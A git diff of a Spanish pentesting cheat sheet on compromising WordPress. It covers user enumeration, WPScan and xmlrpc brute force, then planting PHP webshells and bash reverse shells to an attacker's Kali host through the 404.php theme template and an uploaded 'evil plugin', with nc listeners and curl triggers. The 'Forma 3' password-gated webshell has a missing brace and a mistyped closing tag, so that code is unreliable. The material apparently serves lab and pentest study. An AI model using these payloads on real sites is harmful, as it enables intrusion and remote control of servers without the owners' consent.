@@ -21,8 +21,6 @@ Tags: #WordPress #CMS #WPScan #WPProbe #Enumeracion #FuerzaBruta #RCE #LFI #xmlr
 * [DVWP Lab](https://github.com/vavkamil/dvwp) → laboratorio práctico
 * [Xmlrpc Abuse](https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/)
 
----
-
 ## 1. RUTAS Y ARCHIVOS CLAVE
 
 ### Rutas web importantes
@@ -55,13 +53,11 @@ Tags: #WordPress #CMS #WPScan #WPProbe #Enumeracion #FuerzaBruta #RCE #LFI #xmlr
 # Con esas credenciales → http://IP/phpmyadmin → usuarios y hashes en la DB
 ```
 
----
-
 ## 2. ENUMERACIÓN INICIAL
 
 ### Identificar versión y tecnologías
 ```bash
-❯ whatweb http://<IP>/
+❯ whatweb -a1 http://<IP>/
 # Versión de WordPress, plugins, servidor
 
 ❯ curl -s http://<IP>/readme.html | grep -i "version"
@@ -86,17 +82,18 @@ Tags: #WordPress #CMS #WPScan #WPProbe #Enumeracion #FuerzaBruta #RCE #LFI #xmlr
 
 ### Enumerar usuarios manualmente
 ```bash
+❯ curl -s -I -X GET "http://<IP>/wordpress/\?rest_route\=/wp/v2/users"
+# Enumerarción manual 
+
 ❯ curl -s -I -X GET "http://<IP>/?author=1"
 # Redirige al nombre del usuario → ver Location en cabeceras
 
 ❯ curl -s "http://<IP>/wp-json/wp/v2/users/" | python3 -m json.tool
 # Lista usuarios en JSON → sin autenticación si está habilitado
 
-❯ for i in {1..10}; do echo -n "author=$i: "; curl -s "http://<IP>/?author=$i" -I | grep Location; done
+❯ for i in {1..10}; do echo -n "author=$i: "; curl -s "http://<IP>/wordpress/?author=$i" -I | grep Location; done
 # Iterar para encontrar varios usuarios
 ```
-
----
 
 ## 3. WPSCAN — ENUMERACIÓN COMPLETA
 
@@ -110,9 +107,10 @@ Tags: #WordPress #CMS #WPScan #WPProbe #Enumeracion #FuerzaBruta #RCE #LFI #xmlr
 ```
 
 ### Enumeración específica
-
-
 ```bash
+❯ wpscan --url http://<IP>/wordpress/ --enumerate u --no-update 
+# Enumerar usuarios sin actualizar la herramienta 
+
 ❯ wpscan --url http://<IP>/ -e u,vp
 # -e u → usuarios | -e vp → plugins vulnerables
 
@@ -144,8 +142,6 @@ Tags: #WordPress #CMS #WPScan #WPProbe #Enumeracion #FuerzaBruta #RCE #LFI #xmlr
 # Fuerza bruta vía xmlrpc → más rápido → sin rate limiting
 ```
 
----
-
 ## 4. WPPROBE
 
 ```bash
@@ -158,8 +154,6 @@ Tags: #WordPress #CMS #WPScan #WPProbe #Enumeracion #FuerzaBruta #RCE #LFI #xmlr
 ❯ pip3 install wpprobe --break-system-packages
 # Instalar si no está disponible
 ```
-
----
 
 ## 5. XMLRPC.PHP — ENUMERACIÓN Y FUERZA BRUTA
 
@@ -242,19 +236,31 @@ done
 
 ### Opción 1 — Editar tema existente (más rápido)
 ```bash
-# Appearance → Theme Editor → seleccionar tema activo → 404 Template
+# Appearance → Theme Editor → seleccionar tema activo → 404.php Template
 
+Forma 1:
 # Webshell para ejecutar comandos
 <?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
 
-# Reverse shell directa
+
+Forma 2:
+# Reverse shell directa hacia Kali 
 <?php system("bash -c 'bash -i >& /dev/tcp/<IP_KALI>/443 0>&1'"); ?>
 
+
+NOTA:
+	# Despues de actualizar el template, enviar una petición para que se ejecute el código en:
+		http://<IP>/wordpress/wp-content/themes/twentyfifteen/404.php
+```
+
+```bash 
+Para la forma 1:
 # Acceder al tema modificado
-❯ http://<IP>/wp-content/themes/twentyfifteen/404.php?cmd=whoami
-❯ http://<IP>/wp-content/themes/twentyfifteen/404.php
-# Para reverse shell → nc -nlvp 443 antes de acceder
-# Nota: cerrar el bloque PHP con ?>
+❯ http://<IP>/wordpress/wp-content/themes/twentyfifteen/404.php?cmd=whoami
+
+Para la forma 2:
+# Para reverse shell en Kali
+❯ rlwrap nc -nlvp 443
 ```
 
 ### Opción 2 — Subir tema con webshell
@@ -279,17 +285,100 @@ done
 ❯ mkdir evil-plugin
 ❯ nvim evil-plugin/evil-plugin.php
 
-<?php
-/**
- * Plugin Name: Evil Plugin
- * Description: Update
- */
-system("bash -c 'bash -i >& /dev/tcp/<IP_KALI>/443 0>&1'");
-?>
+Forma 1:
+	<?php
+	/**
+	 * Plugin Name: Evil Plugin
+	 * Description: Update
+	 * Version: 1.0
+	 */
+	system("bash -c 'bash -i >& /dev/tcp/<IP_KALI>/443 0>&1'");
+	?>
+
+o 
+
+Forma 2:
+	<?php
+	/**
+	 * Plugin Name: Evil Plugin
+	 * Description: Update
+	 * Version: 1.0
+	 */
+	if (isset($_GET['cmd'])) {
+		system($_GET['cmd']);
+	}
+	?>
+
 
 ❯ zip -r evil-plugin.zip evil-plugin/
 # Plugins → Add New → Upload Plugin → Install Now → Activate
 # Al activar → ejecuta la reverse shell
+```
+
+```bash 
+Para la forma 1:
+# Para reverse shell en Kali
+❯ rlwrap nc -nlvp 443
+```
+
+```bash 
+Para la forma 2:
+# Ejecutar comandos desde la webshell 
+❯ http://IP/wordpress/wp-content/plugins/evil-plugin/evil-plugin.php?cmd=whoami
+
+# Ejecutar comandos desde Kali 
+❯ curl http://IP/wordpress/wp-content/plugins/evil-plugin/evil-plugin.php\?cmd\=whoami
+```
+
+```bash 
+Forma 3:
+# Esta es la forma más profesional de hacerlo 
+
+	<?php
+	/**
+	 * Plugin Name: Plugin
+	 * Description: Update
+	 * Version: 2.0
+	 */
+	 
+	// Verifica si se recibieron los parámetros 'cmd' (comando a ejecutar)
+	// y 'passwd' (contraseña utilizada para autenticar la webshell)
+	if (isset($_REQUEST['cmd']) and isset($_REQUEST['passwd'])) {
+	
+	    // Inicia la etiqueta <pre> para mostrar la salida del comando
+	    // respetando el formato original (saltos de línea y espacios)
+	    echo "<pre>";
+	
+	    // Obtiene el comando enviado por el usuario
+	    $cmd = $_REQUEST['cmd'];
+	
+	    // Obtiene la contraseña proporcionada por el usuario
+	    $password = $_REQUEST['passwd'];
+	
+	    // Compara la contraseña ingresada con la contraseña/hash predefinido ('5e280cb0e45fb3171c53cd8dd49df47f')
+	    // definido por el desarrollador de la webshell
+	    if ($password === '5e280cb0e45fb3171c53cd8dd49df47f') {
+	
+	        // Ejecuta el comando del sistema operativo
+	        // y envía la salida directamente al navegador
+	        system($cmd);
+	
+		// Finalizaa la sección donde se muestra la salida del comando 
+		echo "</prep>";
+		
+		// Termina la ejecución del script despues de mostrar la salida del comando 
+		die;
+	}
+	?>
+```
+
+```bash 
+Para la forma 3:
+# Ejecutar comandos desde la webshell 
+❯ http://IP/wordpress/wp-content/plugins/evil-plugin/evil-plugin.php?passwd=5e280cb0e45fb3171c53cd8dd49df47f&cmd=whoami
+
+# Ejecutar comandos desde Kali 
+❯ curl http://IP/wordpress/wp-content/plugins/evil-plugin/evil-plugin.php\?passwd\=5e280cb0e45fb3171c53cd8dd49df47f\&cmd\=whoami
 ```
 
 ### Opción 4 — Upload vía plugin vulnerable
